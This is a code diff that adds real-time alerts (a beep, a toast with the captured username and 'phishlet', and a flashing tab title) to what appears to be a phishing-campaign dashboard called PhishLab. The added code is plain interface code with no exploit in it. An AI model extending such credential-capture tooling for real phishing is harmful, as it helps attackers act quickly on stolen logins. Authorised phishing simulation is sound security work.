@@ -314,6 +314,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
 .cstat.vulnerable{background:var(--amber-dim);color:var(--amber);border:1px solid rgba(255,179,0,.4)}
 .cstat.exploitable{background:var(--red-dim);color:var(--red);border:1px solid rgba(255,23,68,.4);animation:pulse-red 2s ease-in-out infinite}
 @keyframes pulse-red{0%,100%{box-shadow:0 0 0 0 rgba(255,23,68,.5)}50%{box-shadow:0 0 0 6px rgba(255,23,68,0)}}
+@keyframes toastIn{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}
 @media(prefers-reduced-motion:reduce){.cstat.exploitable{animation:none}}
 .recpane{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 16px;margin:10px 0}
 .recpane h4{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:var(--cyan);margin-bottom:10px;font-weight:700}
@@ -723,10 +724,87 @@ function load(){
     .catch(function(e){var b=document.getElementById('err');b.textContent='Dashboard API error: '+e.message;b.style.display='block';});
 }
 
+// === Real-time capture notifications ===
+// The poller already broadcasts {type:"credential_captured",...} via WS;
+// upgrade ws.onmessage to surface that with audio + tab-title flash + toast
+// so the operator can have the dashboard backgrounded and still get a signal.
+
+var origTitle=document.title;
+var unseenCaptures=0;
+var titleFlashInterval=null;
+
+function flashTitle(){
+  if(document.hidden===false){
+    unseenCaptures=0;document.title=origTitle;
+    if(titleFlashInterval){clearInterval(titleFlashInterval);titleFlashInterval=null;}
+    return;
+  }
+  if(titleFlashInterval)return;
+  var alt='\u{1F511} '+(unseenCaptures===1?'New capture':unseenCaptures+' captures')+' — PhishLab';
+  var toggle=false;
+  titleFlashInterval=setInterval(function(){
+    document.title=toggle?origTitle:alt;
+    toggle=!toggle;
+  },1100);
+}
+document.addEventListener('visibilitychange',function(){
+  if(!document.hidden){
+    unseenCaptures=0;document.title=origTitle;
+    if(titleFlashInterval){clearInterval(titleFlashInterval);titleFlashInterval=null;}
+  }
+});
+
+function captureBeep(){
+  // Two-tone web-audio chirp; no external file needed.
+  try{
+    var ctx=new (window.AudioContext||window.webkitAudioContext)();
+    [880,1320].forEach(function(freq,i){
+      var o=ctx.createOscillator(),g=ctx.createGain();
+      o.type='sine';o.frequency.value=freq;
+      o.connect(g);g.connect(ctx.destination);
+      var t=ctx.currentTime+(i*0.18);
+      g.gain.setValueAtTime(0.0001,t);
+      g.gain.exponentialRampToValueAtTime(0.18,t+0.02);
+      g.gain.exponentialRampToValueAtTime(0.0001,t+0.16);
+      o.start(t);o.stop(t+0.18);
+    });
+  }catch(_){/* autoplay/muted — no fallback needed */}
+}
+
+function showCaptureToast(evt){
+  var host=document.getElementById('toast-host');
+  if(!host){host=document.createElement('div');host.id='toast-host';host.style.cssText='position:fixed;top:72px;right:24px;z-index:400;display:flex;flex-direction:column;gap:10px;pointer-events:none';document.body.appendChild(host);}
+  var t=document.createElement('div');
+  var who=evt.username?esc(evt.username):'(no username)';
+  var phl=evt.phishlet?esc(evt.phishlet):'?';
+  t.style.cssText='pointer-events:auto;background:linear-gradient(180deg,rgba(255,23,68,.15),rgba(20,12,16,.95));border:1px solid rgba(255,23,68,.45);border-radius:10px;padding:14px 16px 12px;color:var(--text);font-size:13px;box-shadow:0 12px 32px rgba(255,23,68,.25);min-width:280px;max-width:360px;cursor:pointer;animation:toastIn .3s ease;position:relative;overflow:hidden';
+  t.innerHTML='<div style="font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--red);margin-bottom:6px">&#x1F511; New Capture</div>'
+    +'<div style="font-family:\'SF Mono\',monospace;font-size:12px;color:var(--cyan);margin-bottom:2px">'+who+'</div>'
+    +'<div style="font-size:11px;color:var(--muted)">phishlet '+phl+' &middot; click to view &middot; '+new Date().toLocaleTimeString()+'</div>';
+  t.onclick=function(){
+    var btn=document.getElementById('tab-btn-credentials');
+    if(btn)btn.click();
+    t.remove();
+  };
+  host.appendChild(t);
+  setTimeout(function(){t.style.transition='opacity .4s,transform .4s';t.style.opacity='0';t.style.transform='translateX(20px)';setTimeout(function(){t.remove();},400);},8000);
+}
+
 function connectWS(){
   var proto=location.protocol==='https:'?'wss:':'ws:';
   var ws=new WebSocket(proto+'//'+location.host+'/ws');
-  ws.onmessage=function(){load();};
+  ws.onmessage=function(ev){
+    load();
+    // Try to parse for capture-specific reaction
+    try{
+      var msg=JSON.parse(ev.data);
+      if(msg&&msg.type==='credential_captured'){
+        captureBeep();
+        showCaptureToast(msg);
+        if(document.hidden){unseenCaptures++;flashTitle();}
+      }
+    }catch(_){/* heartbeat or non-JSON; ignore */}
+  };
   ws.onclose=function(){setTimeout(connectWS,3000);};
 }
 
